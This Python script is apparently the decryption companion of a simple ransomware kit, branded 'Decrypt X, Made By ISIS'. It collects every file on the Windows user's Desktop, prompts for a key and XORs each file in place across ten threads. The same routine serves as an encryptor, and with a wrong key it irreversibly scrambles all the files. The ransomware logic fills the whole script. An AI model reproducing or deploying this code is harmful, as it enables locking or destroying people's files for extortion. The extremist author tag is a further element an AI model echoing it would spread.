import os 
import colorama
import threading
import queue

from os import system
from colorama import Fore

def water(text):
    system(""); faded = ""
    green = 10
    for line in text.splitlines():
        faded += (f"\033[38;2;0;{green};255m{line}\033[0m\n")
        if not green == 255:
            green += 15
            if green > 255:
                green = 255
    return faded

print(water("""
    ____                             __     _  __
   / __ \___  ____________  ______  / /_   | |/ /
  / / / / _ \/ ___/ ___/ / / / __ \/ __/   |   / 
 / /_/ /  __/ /__/ /  / /_/ / /_/ / /_    /   |  
/_____/\___/\___/_/   \__, / .___/\__/   /_/|_|  
                     /____/_/      Made By ISIS            
"""))



def decrypt(key):
    while True:
        file = q.get()
        print(f'Decrypting {file}')
        try:
            key_index = 0
            max_key_index = len(key) - 1
            encrypted_data = ''
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'w') as f:
                f.write('')
            for byte in data:
                xor_byte = byte ^ ord(key[key_index])
                with open(file, 'ab') as f:
                    f.write(xor_byte.to_bytes(1, 'little'))
                if key_index >= max_key_index:
                    key_index = 0
                else:
                    key_index += 1
            print(f'{Fore.GREEN}{file} Successfully Decrypted')
        except:
            print(f'{Fore.RED}FAILED TO DECRYPT {file} ')
        q.task_done()

# encryption information
encryption_level = 512 // 8 
key_char_pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ[]#@></\?.,'
key_char_pool_len = len(key_char_pool)

#Grab file Paths 

print(F"{Fore.YELLOW}Preparing Files..")
desktop_path = os.environ['USERPROFILE']+'\\Desktop'
files = os.listdir(desktop_path)
abs_files = []
for f in files:
    if os.path.isfile(f'{desktop_path}\\{f}') and f != __file__[:-2]+'txt':
        abs_files.append(f'{desktop_path}\\{f}')
print(F"{Fore.GREEN}Successfully Located Files")

key = input(f'{Fore.YELLOW}Input Decryption Key: ')

q = queue.Queue()
for f in abs_files:
    q.put(f)

for i in range(10):
    t = threading.Thread(target=decrypt, args=(key,), daemon=True)
    t.start()

q.join()
print(f"{Fore.GREEN}Decryption Complete")
input()